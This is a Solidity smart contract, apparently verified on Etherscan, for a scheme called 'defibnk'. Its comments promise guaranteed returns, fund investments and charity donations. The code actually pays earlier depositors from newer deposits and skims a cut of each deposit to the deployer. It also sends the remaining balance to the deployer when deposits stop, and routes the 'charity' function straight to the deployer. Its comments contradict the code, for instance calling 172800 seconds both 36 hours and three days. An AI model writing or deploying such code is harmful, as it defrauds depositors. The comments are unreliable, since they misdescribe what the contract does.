['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-28\n', '*/\n', '\n', '// SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity^0.8.5;\n', '\n', '\n', 'contract defibnk {\n', '\n', '    // Global Variables\n', '    uint32 public lastPayout;\n', '    uint public lastInvestment;\n', '    uint public profitFromCrash;\n', '    address []  investors;\n', '        struct eliteinvestor {\n', '    \t\taddress payable addr;\n', '    \t\tuint amount;\n', '    \t}\n', '\teliteinvestor [] eliteinvestors;\n', '    uint[] public investmentsMade;\n', '    address payable private bnkfee;\n', '    //address payable public lastcreditor;\n', '    mapping (address => uint) affiliates;\n', '    uint constant THREE_DAYS = 172800;\n', '    uint8 public round;\n', '    uint public totaleliteinvestors = 0;\n', '    uint public percent = 4;\n', '    //Every elite investor gets 4% return on his investment when a new member joins. Elite members become lifelong members and keep receiving interest.\n', '\n', '    constructor () payable {\n', '        // the defibnk is launched. Send 0.05 to 0.15 ETH and get guarenteed 10% return on your investment. Invest 0.15 to 0.5 ETH and get 50% return on your investment. Invest 0.5 to 5 ETH and become an Elite investor.\n', '        profitFromCrash = 100 * 10**18;\n', '        // The defibank is backed by a 100ETH balance. If no new investments are made within 36 hours, this fund will be sent to the last investor as a jackpot.\n', '        bnkfee = payable(msg.sender);\n', '        //a percentage of each investment is used to investment into other cryptocurrencies.  \n', '        lastInvestment = block.timestamp;\n', '        \n', '    }\n', '\n', '    function becomeInvestor(address affiliate) public payable returns (bool) {\n', '        uint amount = msg.value;\n', '        // check if the system already broke down. If for 36hrs no new investor joins then the system will break down.\n', '        // 36h are on average = 172800\n', '        if (lastInvestment + THREE_DAYS < block.timestamp) {\n', '            //Return money to sender\n', '            //lastcreditor = payable(msg.sender);\n', '            payable(msg.sender).transfer(amount);\n', '            // Sends all contract money to the last creditor\n', '            payable (investors[investors.length - 1]).transfer(profitFromCrash);\n', '            bnkfee.transfer(address(this).balance);\n', '            // Reset contract state\n', '            lastPayout = 0;\n', '            lastInvestment = block.timestamp;\n', '            profitFromCrash = 0;\n', '            investors = new address payable [](0);\n', '            investmentsMade = new uint[](0);\n', '            round += 1;\n', '            return false;\n', '        }\n', '        else {\n', '            // investments from the silver members is 0.05 ETH to 0.25 ETH \n', '            if (amount >= 5* 10**16 && amount <= 15 * 10**16 ) {\n', '                lastInvestment = block.timestamp;\n', '                // register investment and his amount with 10% interest rate. Basic members get 10% investment return. \n', '                investors.push(msg.sender);\n', '                investmentsMade.push(amount * 110 / 100);\n', '                // The investment amount and reward have been noted down\n', '                bnkfee.transfer(amount * 20/100);\n', '                // building the jackpot (they will increase the value for the person seeing the crash coming)\n', '                if (profitFromCrash < 1000 * 10**18) {\n', '                    profitFromCrash += amount * 5/100;\n', '                }\n', '                // affiliates get 5% of the invested amount\n', '                if(affiliates[affiliate] >= amount) {\n', '                    payable(affiliate).transfer(amount * 5/100);\n', '                }\n', '                affiliates[msg.sender] += amount * 110 / 100;\n', '                // the money will be used to invest in cryptocurrency funds and then the profit is distributed to our partners.\n', '                if (investmentsMade[lastPayout] <= address(this).balance) {\n', '                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);\n', '                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];\n', '                    lastPayout += 1;\n', '                }\n', '                return true;\n', '            }\n', '            \n', '            else if (amount >= 15 * 10**16 && amount <= 5 * 10**17 ) {\n', '                // the System has received fresh money, it will survive at leat 36h more\n', '                lastInvestment = block.timestamp;\n', '                // register investment and his amount with 50% interest rate. Platinum members get 50% investment return. \n', '                investors.push(msg.sender);\n', '                investmentsMade.push(amount * 150 / 100);\n', '                bnkfee.transfer(amount * 15/100);\n', '                if (profitFromCrash < 1000 * 10**18) {\n', '                    profitFromCrash += amount * 5/100;\n', '                }\n', '                if(affiliates[affiliate] >= amount) {\n', '                    payable(affiliate).transfer(amount * 5/100);\n', '                }\n', '                affiliates[msg.sender] += amount * 110 / 100;\n', '               if (investmentsMade[lastPayout] <= address(this).balance) {\n', '                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);\n', '                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];\n', '                    lastPayout += 1;\n', '                }\n', '                return true;\n', '            }\n', '            else if (amount >= 5 * 10**17 && amount <= 5 * 10**18 ) {\n', '                lastInvestment = block.timestamp;\n', '                // register investment and his amount. Elite members get 1% return on each new elite member who joins.. \n', '                eliteinvestors.push(eliteinvestor(payable(msg.sender), msg.value));\n', '                totaleliteinvestors += 1;\n', '                bnkfee.transfer(amount * 15/100);\n', '                if (profitFromCrash < 1000 * 10**18) {\n', '                    profitFromCrash += amount * 5/100;\n', '                }\n', '                if(affiliates[affiliate] >= amount) {\n', '                    payable(affiliate).transfer(amount * 5/100);\n', '                }\n', '                affiliates[msg.sender] += amount * 110 / 100;\n', '                uint position = 0;\n', '                \n', '                while(position < totaleliteinvestors) {\n', '                    uint payout = (eliteinvestors[position].amount)*percent/100;\n', '                    if(payout > address(this).balance){\n', '                        break;\n', '                    }\n', '                    eliteinvestors[position].addr.transfer(payout);\n', '                    position += 1;\n', '                }\n', '                \n', '                if (investmentsMade[lastPayout] <= address(this).balance) {\n', '                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);\n', '                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];\n', '                    lastPayout += 1;\n', '                }\n', '                return true;\n', '            }\n', '            else {\n', '                payable(msg.sender).transfer(amount);\n', '                return false;\n', '            }\n', '        }\n', '    }\n', '\n', '    // fallback function\n', '    receive() external payable {\n', '        becomeInvestor(address(0));\n', '    }\n', '\n', '    function totalDebt() private view returns (uint debt) {\n', '        for(uint i=lastPayout; i<investmentsMade.length; i++){\n', '            debt += investmentsMade[i];\n', '        }\n', '    }\n', '\n', '    function totalPayedOut() public view returns (uint payout) {\n', '        for(uint i=0; i<lastPayout; i++){\n', '            payout += investmentsMade[i];\n', '        }\n', '    }\n', '\n', '    // All money goes to charities and NGOs accross the world fighting to keep the earth free from global warming and pollution.\n', '    function saveourearth() public payable {\n', '        bnkfee.transfer(msg.value);\n', '    }\n', '\n', '    // Index fund investments run using the money invested into the bank.\n', '    function inheritToNextGeneration(address nextGeneration) public {\n', '        if (msg.sender == bnkfee) {\n', '            bnkfee = payable (nextGeneration);\n', '        }\n', '    }\n', '\n', '    function showinvestors() public view returns (address[] memory) {\n', '        return investors;\n', '    }\n', '    \n', '    function showEliteinvestors() public view returns (eliteinvestor[] memory) {\n', '        return eliteinvestors;\n', '    }\n', '\n', '    function getinvestmentsMade() public view returns ( uint[] memory) {\n', '        return investmentsMade;\n', '    }\n', '}']